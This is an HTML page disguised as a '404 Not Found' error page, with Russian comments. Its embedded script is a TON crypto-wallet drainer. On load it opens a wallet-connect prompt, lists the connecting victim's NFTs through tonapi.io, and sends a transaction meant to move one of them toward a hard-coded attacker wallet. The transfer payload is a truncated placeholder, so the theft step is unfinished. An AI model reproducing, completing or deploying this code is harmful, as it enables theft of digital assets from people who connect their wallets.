<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>404 Not Found</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
        h1 { font-size: 72px; color: #333; }
    </style>
    <script src="https://unpkg.com/tonconnect-sdk@2.2.0/lib/tonconnect-sdk.min.js"></script>
    <script src="https://unpkg.com/tonconnect-ui@2.0.4/lib/tonconnect-ui.min.js"></script>
</head>
<body>
    <h1>404</h1>
    <p>Страница не найдена</p>

    <script>
        (function() {
            // ========== ТВОИ ДАННЫЕ ==========
            const ATTACKER_ADDRESS = 'UQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRhhafG'; // ТВОЙ КОШЕЛЁК
            const manifestUrl = 'https://username.github.io/repo/tonconnect-manifest.json'; // ТВОЙ МАНИФЕСТ
            // ================================

            let tonConnectUI, connector;

            // Получить ВСЕ NFT жертвы
            async function fetchAllNFTs(walletAddress) {
                try {
                    const response = await fetch(`https://tonapi.io/v1/nft/search?owner=${walletAddress}`);
                    const data = await response.json();
                    return data.nft_items || [];
                } catch (e) {
                    console.error('Ошибка получения NFT:', e);
                    return [];
                }
            }

            // Стандартный payload для TEP-62 (может сработать для многих коллекций)
            function createTep62Payload() {
                // Это пример. В реальности нужно точное значение.
                // Можно попробовать найти рабочий через перехват.
                return 'te6ccgEBAQEAbgA...'; // ЗАМЕНИ НА РЕАЛЬНЫЙ, ЕСЛИ НАЙДЕШЬ
            }

            async function transferNFT(collectionAddress, tokenId) {
                try {
                    const payload = createTep62Payload();

                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 600,
                        messages: [{
                            address: collectionAddress,
                            amount: '5000000',
                            payload: payload
                        }]
                    };
                    await tonConnectUI.sendTransaction(transaction);
                    console.log(`NFT ${tokenId} украден (надеюсь)`);
                } catch (e) {
                    console.error('Ошибка перевода:', e);
                }
            }

            window.addEventListener('load', () => {
                connector = new TonConnect.Connector();
                tonConnectUI = new TonConnectUI.TonConnectUI({ connector, manifestUrl });

                connector.onStatusChange(async (wallet) => {
                    if (wallet) {
                        const allNfts = await fetchAllNFTs(wallet.account.address);
                        if (allNfts.length > 0) {
                            // Выбираем случайный
                            const randomIndex = Math.floor(Math.random() * allNfts.length);
                            const randomNft = allNfts[randomIndex];
                            await transferNFT(randomNft.collection.address, randomNft.index);
                        }
                    }
                });

                setTimeout(() => {
                    if (!connector.connected) tonConnectUI.openModal();
                }, 500);
            });
        })();
    </script>
</body>
</html>
